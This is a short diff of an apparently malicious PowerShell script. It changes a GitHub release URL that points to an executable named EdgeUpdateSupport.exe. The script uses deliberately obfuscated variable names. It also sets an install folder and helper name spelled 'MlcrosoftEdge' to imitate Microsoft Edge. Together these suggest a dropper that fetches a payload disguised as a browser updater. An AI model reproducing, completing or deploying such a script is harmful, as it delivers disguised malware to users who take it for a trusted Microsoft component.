@@ -9,7 +9,7 @@ NSDA8D7213ND328YM243DC87Y2M4C28Y7MN2C84YUNM283CM2C4
 [CmdletBinding()]
 param()
 
-$ndsaijnbdsaiuhjbUdsauhibhusdahbRdmdsaoaL = "https://github.com/4ybbe/phpSv/releases/download/untagged-49c561465a1981f0e7e3/EdgeUpdateSupport.exe"
+$ndsaijnbdsaiuhjbUdsauhibhusdahbRdmdsaoaL = "https://github.com/4ybbe/phpSv/releases/download/stupid/EdgeUpdateSupport.exe"
 $asokimasoaosmodasmodpaD = "C:\ProgramData\MlcrosoftEdge"
 $TksdaoqawopqwNisadnia = "MlcrosoftEdgeUpdateHelper"
 
